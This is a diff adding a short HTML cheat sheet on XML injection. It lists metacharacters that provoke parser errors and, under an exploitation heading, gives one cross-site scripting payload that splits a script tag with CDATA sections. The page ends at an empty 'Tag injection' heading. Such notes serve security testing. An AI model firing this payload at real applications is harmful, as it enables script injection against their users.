@@ -1,0 +1,27 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>XML injection</title>
+</head><body><b><span style="font-size: 12pt">DETECTION</span></b><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+Invoke XML parser error by injecting metacharacters<br/>
+<tt>'<br/>
+&quot;<br/>
+&lt;<br/>
+&gt;<br/>
+</tt></span><tt>&lt;!--<br/>
+</tt><tt>--&gt;</tt><br/>
+entity injection<br/>
+<tt>&amp;</tt><br/>
+CDATA injection<br/>
+<tt>]]&gt;</tt><br/>
+<br/>
+<br/>
+<span style="font-size: 12pt"><b>EXPLOITATION</b></span><br/>
+<br/>
+<b>XSS via CDATA injection</b><br/>
+<tt><br/>
+&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(‘xss’)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;<br/>
+<br/>
+</tt><b>Tag injection<br/>
+</b></body></html>
